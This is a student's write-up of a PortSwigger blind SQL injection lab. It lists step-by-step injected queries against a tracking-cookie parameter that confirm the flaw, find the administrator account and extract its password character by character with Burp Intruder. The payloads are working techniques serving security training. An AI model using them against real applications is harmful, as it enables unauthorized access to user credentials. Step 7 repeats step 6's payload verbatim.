# SQL Injection - Blind SQLi with conditional responses

## 📌 Lab Details
- **Title**: Blind SQLi with conditional responses.
- **Difficulty**: Practitioner
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/5aeeac77d52d55cdff3f9a5d86d050c9a77ebfef7657cccb459bee29ad5c3fce?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-conditional-responses

## 🔍 Summary
This lab demonstrated how Blind SQLi works and to brute force a password of the administrator.

## 🛠 Steps to Solve
1. Confirm that the parameter is vulnerable to blind SQLi -> `select tracking-id from tracking-table where trackingId='kkNCmXuIjKg6xv3o'`.
   If this tracking id exist -> query returns value -> Welcome back message.
   If this tracking id doesn't exist -> query returns nothing.
2. `select tracking-id from tracking-table where trackingId='kkNCmXuIjKg6xv3o' and 1=1--'`
   TRUE -> Welcome back
   `select tracking-id from tracking-table where trackingId='kkNCmXuIjKg6xv3o' and 1=0--'`
   FALSE -> no message
   This confirms that application is vulnerable to blind SQLi.
3. Confirm that a `users` table exists -> `select tracking-id from tracking-table where trackingId='kkNCmXuIjKg6xv3o' and (select 'x' from users LIMIT 1)='x'--'`
   TRUE -> Welcome back.
4. Confirm that username `administrator` exist in the database -> `select tracking-id from tracking-table where trackingId='kkNCmXuIjKg6xv3o' and (select username from users where username='administrator')='administrator'--'`
   TRUE -> Welcome back -> administrator user exists.
5. Determining the length of the password by a brute force attack -> `select tracking-id from tracking-table where trackingId='kkNCmXuIjKg6xv3o' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'`
   -> password is exactly `20` characters.
6. Determining the first character of the password -> `select tracking-id from tracking-table where trackingId='kkNCmXuIjKg6xv3o' and (select substring(password,1,1) from users where username='administrator')='a'--'`
   -> `5` is the first character.
7. Determining the complete password using a `cluster bomb` attack -> `select tracking-id from tracking-table where trackingId='kkNCmXuIjKg6xv3o' and (select substring(password,1,1) from users where username='administrator')='a'--'`
   -> password is `yffiwhnsfhtirdglb47q`
   
## 📖 Key Takeaways
- Understanding how `Blind SQLi` works.
- Understanding how to implement `brute force` attack with the help of `intruder`.
  
## 🖼️ Screenshot (if needed)
![image](https://github.com/user-attachments/assets/3cfb73ba-ca65-4cb3-bb3e-b1df114a7953)
![image](https://github.com/user-attachments/assets/8d172ad5-e80e-4a86-ab79-12a2ae4065a3)
![image](https://github.com/user-attachments/assets/6e66b633-1718-463b-8c84-b4d02cd890f0)
![image](https://github.com/user-attachments/assets/a1d0b0ad-2bab-4a11-ad7a-137662ab372e)
![image](https://github.com/user-attachments/assets/71fd9d4d-3554-4dfc-a6d0-c09f06bdbc52)
![image](https://github.com/user-attachments/assets/06d0ea9b-3bf1-4c48-bb58-be8a300e9c5f)
![image](https://github.com/user-attachments/assets/221e9a93-43cc-414e-9af6-0be883c28e6b)
![image](https://github.com/user-attachments/assets/8bd5637d-7385-4ccb-bdc4-53709d7f6d87)
![image](https://github.com/user-attachments/assets/0d0c8805-768a-4ae4-81d6-59f9833efac2)

